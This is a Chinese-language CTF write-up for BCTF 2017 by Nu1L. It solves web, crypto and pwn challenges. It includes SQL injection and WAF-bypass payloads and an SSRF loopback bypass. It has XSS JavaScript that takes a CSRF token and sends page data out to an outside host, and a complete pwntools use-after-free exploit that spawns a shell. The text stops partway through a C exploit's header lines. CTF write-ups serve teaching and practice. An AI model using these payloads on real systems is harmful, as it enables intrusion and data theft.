BCTF2017-Writeup
By Nu1L
Misc
签到：
Nc 连上去输入 token，得到 flag。
foolme
关键点 1：哈希碰撞得到 md5 值结尾相同的 key.使用穷举方法即可。
关键点 2：发送满足条件的 jpg 图片的数据。校验函数是 check。
直接修改可以影响 diff 值的数据即可，即 input_x,input_y,input_z 的值。不断修改像素值，将
diff 值调高，但是不可以大于 2，并且被识别引擎识别为与原图不同的图片。
Web:
signature
Github 搜索源码。很容易搜到源码，下载后进行分析：
很容易看出是 CI 写的一个 Demo 站点。
在 blog_backup_2014.php 中很容易发现：
成功登陆后，在 admin 页面处发现注入：
发现经过了 waf 处理...但是出题人给的源码里把 waf 函数已经抽空，黑盒 fuzz 后发现貌似只
过滤了空格，用括号绕过即可，注入得到最终的表结构，然后发现 flag 在 payment.php 中：
读取数据，然后构造 signature，post 得到最终 flag。(忘记截图...
PS：题目注入的时候服务器反应的确有点慢，不如将数据库的结构在源码中有所体现，可能
会增加选手的做题快感 XD。
baby sqli
首先输入 admin'#绕过登陆，提示有 4 个 item，一个一个的买，买到 d 拿到 flag：
bctf{8572160a2bc7743ad02b539f74c24917}
Kitty shop
题目接着刚才的做，有一个可以下载 manual 的地方，fuzz 发现存在任意文件下载：
Fuzz 目录：
得到一个地址/app/encrypt0p@ssword/passwor：
访问 http://baby.bctf.xctf.org.cn/encrypt0p@ssword/password：
利用 kaiity 的任意文件下载拿到 client 的 elf 文件。如图 sub_401B6A 函数中调用了 recv 函数
接受服务器数据，
对 recv 函数下断分析接收的数据得到如下图所示的内容：
Paint
涉及两个知识点，一个 curl 的拼接访问，一个是 127.0.0.1 呗过滤之后的绕过，curl 可以拼
接访问，curl http://a.com/{a.gif,b.gif},还有就是 127.0.0.1 被过滤之后的绕过，可以用 127.0.0.2
绕过。我们首先将一张图片切成 2 分，中间差距正好应该是 flag.php 的请求大小。首先在地
址那里输入 http://127.0.0.2/flag.php 获知大小是 374 字节，之后用我们的脚本切割图片，上
传
之后在地址那里输入
http://127.0.0.2/{uploads/1492269999HkwuqBYX.gif,flag.php,uploads/1492270040evG9tmYw.gif}
得到新的图片：
访问就是 flag
> 后来我发现其实只要切割大小小于 374 都可以拿到 flag，原因不详
file1 = open('a.gif', 'r')
data = file1.read()
i1 = data[:200]
i2 = data[573:]
f1 = open("1.gif", "w")
f1.write(i1)
f1.close()
f2 = open("2.gif", "w")
f2.write(i2)
f2.close()
Only admin
首先是登陆，忘记密码那里，输入用户名 admin 和随便一个邮箱，查看源码有一个 md5，
解开就是 admin 的密码，登陆，发现存在 cookie，解开是 user 的 md5，修改成 admin 的 md5，
拿到一个 github 的用户，访问上去，有一个 apk，反编译一下，解密就好。有点扯淡的题目，
不解释
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
public class MyTest {
public static void main(String[] args) throws Exception {
SecretKeySpec key = new SecretKeySpec("3742#AES$$JKL:cn".getBytes(), "AES");
Cipher v0 = Cipher.getInstance("AES/ECB/PKCS5Padding");
v0.init(2, key);
byte[] b = null;
b
=
Base64.getDecoder().decode("+ipteaf41bn/76A25zWVDwgc7x5vOtBFHDrBpg9NSTw=");
System.out.println(new String(v0.doFinal(b)));
}
}
Alice and Bob
基于语义的 waf,
引入能够打乱语义判断的就可以触发到了
mysql 有 mod 的比较符和函数
想着通过引入两个去打乱语义
payload:
'mod mod(1,1) union select flag from flag#
Diary
跟 uber 的案例差不多：
题目一看就是 xss 的，认证过程是 Oauth，直接那这个网址上面的 payload 就可以复现，一
共三个文件
> http://xss.xxx.cn/attack/albert2.js
> http://xss.xxx.cn/attack/index.html
> http://xss.xxx.cn/attack/login-target.html
var loginIframe = document.createElement('iframe');
loginIframe.setAttribute('src', 'http://xss.albertchang.cn/attack/login-target.html');
top.document.body.appendChild(loginIframe);
setTimeout(function() {
//document.cookie
=
"csrftoken=cQmHtL1l4LyBPq8eg5yp9Sf6JrZrkqdiySkSf36veE13JypisP4YKOyEjKywR96F;domain=*.x
ctf.org.cn;path=/";
//console.log(document.cookie['csrftoekn']);
//cookie 动态获取，本来想着直接写死的，但是没有成功,本层只有一个 cookie 是 csrftoken，
直接取出来就好
var token= document.cookie.split('=')[1];
console.log(token);
$.post("http://diary.bctf.xctf.org.cn/survey/",
{rate:'1',suggestion:'albertchang',csrfmiddlewaretoken:token},
function (data){
$.get("http://xss.albertchang.cn/?data="+escape(data));
}
);}
, 9000);
Crypto
Hulk:
首先测试发现 flag 应该是 38 位，因为输入 9 个字符和 10 个字符明显多出来一组，所以根据
拼接方式可以知道应该是 38 位
#!/usr/bin/env python
# encoding: utf-8
from zio import *
flag = ''
target = ('202.112.51.217',9999)
dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}"
def get_payload(a, b, c):
return ''.join(chr(ord(a[i]) ^ ord(b[i]) ^ ord(c[i])) for i in xrange(16))
def exp(i, payload):
io
=
zio(target,
timeout=5,
print_read
=
COLORED(NONE,
'red'),
print_write
=
COLORED(NONE, 'green'))
io.read_until('encrypt: 0x')
pay1 = '30' * (48-i)
io.writeline(pay1)
io.read_until('ciphertext')
data = io.read_until('Give')
io.read_until('encrypt: 0x')
ciphertext1 = data[data.find('0x')+2:-5]
data1 = ciphertext1[64:96]
tmp = ('0' * (39 - len(flag + payload)) + flag + payload)[-16:]
pay2
=
get_payload(ciphertext1[32:64].decode('hex'),
ciphertext1[-32:].decode('hex'),
tmp).encode('hex')
io.writeline(pay2)
io.read_until("ciphertext")
r2 = io.read_until("\n")
ciphertext12 = r2[r2.find('0x')+2:r2.find('0x')+34]
io.close()
if data1 == ciphertext12:
return 1
else :
return 0
for i in xrange(1, 39):
for pay in dic:
if exp(i, pay):
flag += pay
print flag
break
print flag
Pwn
Babyuse (PWN)
select 之后 drop 会导致 use 时 uaf，泄露堆上地址和 vtable 然后伪造 vtable 可以执行任意代
码。
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys
#r = process("./babyuse")
token = '4e4ARInVS102IeYFkmUlBUVjOojxsMKC'
r = remote('202.112.51.247', 3456)
context(log_level='DEBUG')
def ru(delim):
return r.recvuntil(delim)
def rn(c):
return r.recvn(c)
def sn(d):
return r.send(d)
def sl(d):
return r.sendline(d)
def menu():
return ru('Exit\n')
def buy(index, length, name):
menu()
sl('1')
ru('add:')
sl(str(index))
ru('name')
sl(str(length))
ru('name:')
sn(name)
return
def select(index):
menu()
sl('2')
ru('gun')
sl(str(index))
return
def list():
menu()
sl('3')
return
def rename(index, length, name):
menu()
sl('4')
ru('rename')
sl(str(index))
ru('name')
sl(str(length))
ru('name:')
sn(name)
return
def use(ops):
menu()
sl('5')
for c in ops:
sl(str(c))
return
def drop(index):
menu()
sl('6')
ru('delete:')
sl(str(index))
return
def main():
#gdb.attach(r)
ru('Token:')
sl(token)
buy(1, 215-8, 'A'*(215-8))
buy(1, 31, 'A'*31)
buy(1, 31, 'A'*31)
buy(1, 31, 'A'*31)
select(2)
drop(2)
rename(3, 15, 'AAAA\n')
menu()
sl('5')
ru('Select gun ')
pie = u32(rn(4)) - 0x1d30
log.info('pie = ' + hex(pie))
heap = u32(rn(4))
log.info('heap_leak = ' + hex(heap))
sl('4')
buy(1, 31, 'A'*31)
drop(2)
fake_vtable = heap + 192
rename(1, 63, p32(pie+0x172e).ljust(63, 'A'))
rename(3, 15, p32(fake_vtable) + p32(pie + 0x3fd0) + '\n')
menu()
sl('5')
ru('Select gun ')
addr = u32(rn(4)) - 0x712f0
system = addr + 0x3ada0
binsh = addr + 0x15b82b
info("libc = " + hex(addr))
payload = '1 '.ljust(12)
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)
sl(payload)
r.interactive()
return
if __name__ == '__main__':
main()
Monkey (PWN)
mozilla 的 jsshell，可以在网上找到其源码，阅读发现其中加入了全局对象 os，其中有 system
函数。
Payload：os.system(‘/bin/sh’);
BOJ (PWN)
这是个黑盒测试题，经过测试发现可以使用 socket 系统调用，所以可以获得程序运行结果。
首先 readdir 列目录，看到环境内部如/proc，/sys 等目录都没有挂载，猜测程序在 chroot jail
中，在/root/发现了 scf.so，经过分析发现该 so 经过 LD_PRELOAD 加载到当前进程，使用了
seccomp 阻止了关键 syscall，于是用 x32 ABI 绕过之，通过 chdir + chroot 的方式绕过 chroot jail。
逃出 jail 后在根目录发现 flag 但是没有权限读取，在/home 目录下发现了 sandbox 和 cr，cr
是负责编译与运行程序的类似 crontab 的程序，在其中存在命令注入漏洞，可以得到 flag。
Exploit:
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 